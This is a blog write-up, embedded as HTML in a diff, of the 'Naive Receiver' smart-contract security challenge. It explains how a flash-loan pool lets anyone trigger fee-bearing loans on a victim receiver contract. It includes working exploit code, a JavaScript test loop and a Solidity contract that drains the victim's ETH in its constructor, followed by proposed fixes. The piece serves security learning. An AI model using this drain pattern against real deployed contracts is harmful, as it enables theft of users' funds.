@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Naive Receiver - lmkalg's blog</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Naive Receiver", url: "#_top", children: [
+              {title: "Statement", url: "#statement" },
+              {title: "Analysis", url: "#analysis" },
+              {title: "Exploit", url: "#exploit" },
+              {title: "Fix", url: "#fix" },
+              {title: "Extra", url: "#extra" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../hackthebox/registration/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../hackthebox/registration/" class="btn btn-xs btn-link">
+        Initial registration to HTB
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../.." class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../.." class="btn btn-xs btn-link">
+        Home
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="naive-receiver">Naive Receiver</h1>
+<h2 id="statement">Statement</h2>
+<p>There's a lending pool offering quite expensive flash loans of Ether, which has 1000 ETH in balance.
+You also see that a user has deployed a contract with 10 ETH in balance, capable of interacting with the lending pool and receiving flash loans of ETH.
+Drain all ETH funds from the user's contract. Doing it in a single transaction is a big plus ;)</p>
+<h2 id="analysis">Analysis</h2>
+<p>To be honest, I lost quite a lot of time trying to find the bug in order to drain all the ETH from the FlashLoans' contract. After re-reading the challenge statement, I went to my blackboard and wrote 100 times:
+<img alt="naive_bart" src="../images/naive_barrt.png" /></p>
+<h3 id="understanding-contracts">Understanding contracts</h3>
+<p>Our main goal for this challenge is to drain all the ETH from the <strong>User's contract</strong>. </p>
+<p>There are two contracts:</p>
+<ul>
+<li><strong>NaiveReceiverLenderPool.sol</strong>: Contract which implements the logic of the lending pool.</li>
+<li><strong>FlashLoanReceiver.sol</strong>: Contract which implements the logic of receiving funds from the lending pool.</li>
+</ul>
+<p>Let's first analyze the lending pool contract: </p>
+<p>It has three different functions: </p>
+<ul>
+<li><strong>fixedFee</strong>: Which returns the value of the private constant (and expensive) fee. </li>
+<li><strong>receive</strong>: Just to be able to receive eth in this Smart Contract.   </li>
+<li><strong>flashLoan</strong>: Function that implements the lending logic. </li>
+</ul>
+<pre><code class="language-java">function flashLoan(address borrower, uint256 borrowAmount) external nonReentrant {
+
+1.        uint256 balanceBefore = address(this).balance;
+2.        require(balanceBefore &gt;= borrowAmount, &quot;Not enough ETH in pool&quot;);
+3.
+4.
+5.        require(borrower.isContract(), &quot;Borrower must be a deployed contract&quot;);
+6.        // Transfer ETH and handle control to receiver
+7.        borrower.functionCallWithValue(
+8.            abi.encodeWithSignature(
+9.                &quot;receiveEther(uint256)&quot;,
+10.                FIXED_FEE
+11.            ),
+12.            borrowAmount
+13.        );
+14.        
+15.        require(
+16.            address(this).balance &gt;= balanceBefore + FIXED_FEE,
+17.            &quot;Flash loan hasn't been paid back&quot;
+18.        );
+</code></pre>
+<p>Some notes about this code: </p>
+<ol>
+<li>It has the <strong>1nonReentrant</strong> modifier. So, no reentrancy possible. </li>
+<li>In the first two lines, it basically checks that the borrowed amount provided as a parameter, doesn't exceed the amount of eth the lending pool has. If it does exceed, it reverts. </li>
+<li>The 5th "ensures" that the borrower address provided as parameter, is a contract address and not an EOA. However, the implementation of <strong>isContract()</strong> basically checks that codeSize of the provided address is not empty. This action could occur because of several reasons. For more info check this <a href="https://secureum.substack.com/p/solidity-201">Secureum blog key #159</a>.... Idea (spoiler): There is no check that the borrower was actually the one sending the message?</li>
+<li>Lines 7-13 implements the external call to the borrower. It calls the <strong>receiveEther()</strong> function that should be implemented within the borrower's Smart Contract. It basically gives the control to the borrower in order to do whatever they want with the money. </li>
+<li>It ensures that the loan was returned by checking the current balance (plus fee).</li>
+</ol>
+<p>Let's know see what logic is implemented in the use user's contract..It has three different functions: </p>
+<ul>
+<li><strong>_executeActionDuringFlashLoan</strong>: Which is there as a placeholder for all the logic that the user would want to do once they got the money. </li>
+<li><strong>receive</strong>: Just to be able to receive eth in this Smart Contract.   </li>
+<li><strong>receiveEther</strong>: Which is in charge of receiving the money from the flashloan</li>
+</ul>
+<pre><code class="language-java">1. function receiveEther(uint256 fee) public payable {
+2.         require(msg.sender == pool, &quot;Sender must be pool&quot;);
+3.
+4.         uint256 amountToBeRepaid = msg.value + fee;
+5. 
+6.         require(address(this).balance &gt;= amountToBeRepaid, &quot;Cannot borrow that much&quot;);
+7.         
+8.         _executeActionDuringFlashLoan();
+9.         
+10.        // Return funds to pool
+11.        pool.sendValue(amountToBeRepaid);
+12.    }
+</code></pre>
+<p>Some notes about this code: </p>
+<ol>
+<li>It doesn't have a reentrant modifier.. will this help us? </li>
+<li>The 2nd line ensures that the one actually sending the money (loan) is the lending pool. </li>
+<li>4th and 6th basically checks that the user is able to borrow that amount of money. </li>
+<li>8th is the placeholder to implement the logic. </li>
+<li>11th returns the loan.</li>
+</ol>
+<h3 id="final-solution">Final solution</h3>
+<p>From my POV, the most interesting thing was the use of <strong>isContract()</strong> inside <strong>flashLoan()</strong>. This was the moment when I realised that the smart contract wasn't checking if the entity who sent the message to it was the borrower or anyone else. Meaning that anyone, even from an EOA, could use the <strong>FlashLoanReceiver's</strong> address as borrower. If this happens, every call to <strong>flashloan()</strong>  will mean that, at least, you're draining 1 ETH from the user's contract (the fee). </p>
+<p>There is even no check to ensure that the borrowed amount is greater than 0, meaning that an attacker can call this function 10 times and drain all 10 ETH from the user's contract.</p>
+<h2 id="exploit">Exploit</h2>
+<p>The final exploit to solve this challenge could be: </p>
+<pre><code class="language-javascript"> it('Exploit', async function () {
+    for (let i = 0; i &lt; 10; i++){
+        await this.pool.flashLoan(this.receiver.address, 0);
+    }
+    });
+</code></pre>
+<h2 id="fix">Fix</h2>
+<p>As part of my learning phase of Smart Contracts Security, I like to think which code changes could be carried out in order to be protected against this issue. 
+I'd add to the lending Smart Contract: </p>
+<ol>
+<li>
+<p>A line to ensure that the message sender is the borrower. 
+    <code>require(msg.sender == borrower, "Message sender is not the borrower");</code></p>
+</li>
+<li>
+<p>A line to ensure that empty flashloans are not possible (in order to protect the users of the protocol) 
+    <code>require(borrowAmount &gt; 0, "Empty flashloans are not allowed);</code></p>
+</li>
+</ol>
+<h2 id="extra">Extra</h2>
+<p>From the challenge's statement:</p>
+<pre><code>[..] Doing it in a single transaction is a big plus ;)
+</code></pre>
+<p>The key concept here is the difference between a transaction and a message. Transactions are always issued by EOA's. With this idea in mind, what we could do is develop a Smart Contract that would do the job (loop) for us and call 10 times the <strong>flashloan()</strong> function from the pool. To minimize the amount of transaction (just one) we have to execute the "exploit payload" in the constructor. I developed the following SC and stored it inside <strong>contracts/attacker-contracts</strong>:</p>
+<pre><code class="language-java">// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.0;
+
+import &quot;@openzeppelin/contracts/utils/Address.sol&quot;;
+
+contract NaiveReceiverExploiter {
+    using Address for address payable;
+
+    constructor(address payable pool, address payable user) {   
+        while (user.balance &gt; 0) {
+            (bool success, ) = pool.call(
+                abi.encodeWithSignature(
+                    &quot;flashLoan(address,uint256)&quot;,
+                    user,
+                    0
+                )
+            );
+            require(success, &quot;External call failed&quot;);
+        }        
+    }
+    receive () external payable {}
+}
+</code></pre>
+<p><strong><em>Sorry for my poor Solidity skills, still working on that</em></strong></p>
+<p>Then, I modified the <strong>naive-receiver.challenge.js</strong> with: </p>
+<pre><code class="language-javascript">    it('Exploit', async function () {
+        const ExploiterFactory = await ethers.getContractFactory(&quot;NaiveReceiverExploiter&quot;);
+        this.exploiter = await ExploiterFactory.deploy(this.pool.address, this.receiver.address);
+    });
+</code></pre>
+<p>And that was all :) </p>
+
+  <br>
+</div>
+
+<footer class="col-md-12 wm-page-content">
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="">Windmill Dark</a> theme by None (noraj).</p>
+</footer>
+
+</body>
+</html>
